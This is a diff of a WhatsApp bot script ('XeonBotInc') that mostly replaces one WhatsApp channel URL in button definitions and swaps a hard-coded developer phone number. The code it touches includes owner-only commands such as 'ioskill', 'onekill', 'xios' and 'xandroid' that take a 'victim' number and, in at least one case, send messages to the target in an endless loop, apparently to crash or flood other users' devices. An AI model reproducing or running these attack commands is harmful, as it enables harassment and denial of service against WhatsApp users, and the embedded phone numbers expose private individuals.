+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -23154,7 +23095,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -23204,7 +23145,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -23356,7 +23297,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -23570,7 +23511,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -23620,7 +23561,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -23772,7 +23713,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -24114,7 +24055,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -24164,7 +24105,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -24316,7 +24257,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 		      }
            ],
           }),
@@ -24537,7 +24478,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -24587,7 +24528,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -24739,7 +24680,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -24954,7 +24895,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -25004,7 +24945,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -25156,7 +25097,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -25368,7 +25309,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
   "name": "quick_reply",
@@ -25422,7 +25363,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -25574,7 +25515,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -25784,7 +25725,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               } 
            ],
           })
@@ -25834,7 +25775,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -25986,7 +25927,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -26202,7 +26143,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -26252,7 +26193,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -26404,7 +26345,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -26627,7 +26568,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -26677,7 +26618,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -26829,7 +26770,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -26871,7 +26812,7 @@ case "xandroid": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "201121968769") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -26903,7 +26844,7 @@ case "xios": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "201121968769") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -27019,7 +26960,7 @@ case "xios2":
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "201121968769") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -27051,7 +26992,7 @@ case "xsysui": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "201121968769") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -27071,7 +27012,7 @@ break;
 case 'ioskill': case 'iosx': {
             	if (!XeonTheCreator) return
 let xeonyvictim = q.replace(/[^0-9]/g, "")
-if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 916909137213`)
+if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 201121968769`)
 await replygcxeon(`In process....`)
 let target = xeonyvictim + '@s.whatsapp.net'
   for (;;) {
@@ -27082,9 +27023,9 @@ let target = xeonyvictim + '@s.whatsapp.net'
 break
 case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
 if (!XeonTheCreator) return
-if (!q) return replygcxeon(`Usage .${command} 916909137213`)
+if (!q) return replygcxeon(`Usage .${command} 201121968769`)
 let xeonyvictim = q.replace(/[^0-9]/g, "")
-if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 916909137213`)
+if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 201121968769`)
 let target = xeonyvictim + '@s.whatsapp.net'
 await replygcxeon(`In process....`)
 for (let j = 0; j < 1; j++) {
@@ -27139,7 +27080,7 @@ XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
 	} catch (err) {
 		console.log(util.format(err))
         let e = String(err)
-XeonBotInc.sendMessage("916909137213@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
+XeonBotInc.sendMessage("201121968769@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
 contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true
